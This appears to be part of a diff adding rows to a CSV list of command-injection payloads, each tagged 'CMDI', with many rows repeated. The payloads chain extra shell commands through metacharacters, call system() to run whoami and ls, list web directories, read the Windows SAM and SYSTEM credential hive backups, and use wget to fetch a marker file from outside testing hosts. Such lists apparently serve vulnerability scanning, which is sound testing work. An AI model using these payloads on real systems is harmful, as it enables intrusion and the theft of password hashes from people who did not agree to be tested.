+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,CMDI
+system('whoami'),CMDI
+system('whoami'),CMDI
+system('whoami'),CMDI
+system('whoami'),CMDI
+system('whoami');,CMDI
+system('whoami');,CMDI
+system('whoami');,CMDI
+system('whoami');,CMDI
+"System(""ls -al /"")",CMDI
+"test* & perl -e 'print ""X""x16096'",CMDI
+"test* & perl -e 'print ""X""x16096'",CMDI
+"test* & perl -e 'print ""X""x16096'",CMDI
+"test* & perl -e 'print ""X""x16096'",CMDI
+"test* && perl -e 'print ""X""x16096'",CMDI
+"test* && perl -e 'print ""X""x16096'",CMDI
+"test* && perl -e 'print ""X""x16096'",CMDI
+"test* && perl -e 'print ""X""x16096'",CMDI
+"test* | perl -e 'print ""X""x16096'",CMDI
+"test* | perl -e 'print ""X""x16096'",CMDI
+"test* | perl -e 'print ""X""x16096'",CMDI
+"test* | perl -e 'print ""X""x16096'",CMDI
+"test* || perl -e 'print ""X""x16096'",CMDI
+"test* || perl -e 'print ""X""x16096'",CMDI
+"test* || perl -e 'print ""X""x16096'",CMDI
+"test* || perl -e 'print ""X""x16096'",CMDI
+test*; ls -lhtR /var/www/,CMDI
+test*; ls -lhtR /var/www/,CMDI
+test*; ls -lhtR /var/www/,CMDI
+test*; ls -lhtR /var/www/,CMDI
+"test*; perl -e 'print ""X""x16096'",CMDI
+"test*; perl -e 'print ""X""x16096'",CMDI
+"test*; perl -e 'print ""X""x16096'",CMDI
+"test*; perl -e 'print ""X""x16096'",CMDI
+type %SYSTEMROOT%\repair\SAM,CMDI
+type %SYSTEMROOT%\repair\SAM,CMDI
+type %SYSTEMROOT%\repair\SAM,CMDI
+type %SYSTEMROOT%\repair\SAM,CMDI
+type %SYSTEMROOT%\repair\SYSTEM,CMDI
+type %SYSTEMROOT%\repair\SYSTEM,CMDI
+type %SYSTEMROOT%\repair\SYSTEM,CMDI
+type %SYSTEMROOT%\repair\SYSTEM,CMDI
+type C:\Windows\repair\SAM,CMDI
+type C:\Windows\repair\SAM,CMDI
+type C:\Windows\repair\SAM,CMDI
+type C:\Windows\repair\SAM,CMDI
+type C:\Windows\repair\SYSTEM,CMDI
+type C:\Windows\repair\SYSTEM,CMDI
+type C:\Windows\repair\SYSTEM,CMDI
+type C:\Windows\repair\SYSTEM,CMDI
+type C:\WINNT\repair\SAM,CMDI
+type C:\WINNT\repair\SAM,CMDI
+type C:\WINNT\repair\SAM,CMDI
+type C:\WINNT\repair\SAM,CMDI
+type C:\WINNT\repair\SYSTEM,CMDI
+type C:\WINNT\repair\SYSTEM,CMDI
+type C:\WINNT\repair\SYSTEM,CMDI
+type C:\WINNT\repair\SYSTEM,CMDI
+wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
+wget https://crowdshield.com/.testing/rce_vuln.txt,CMDI
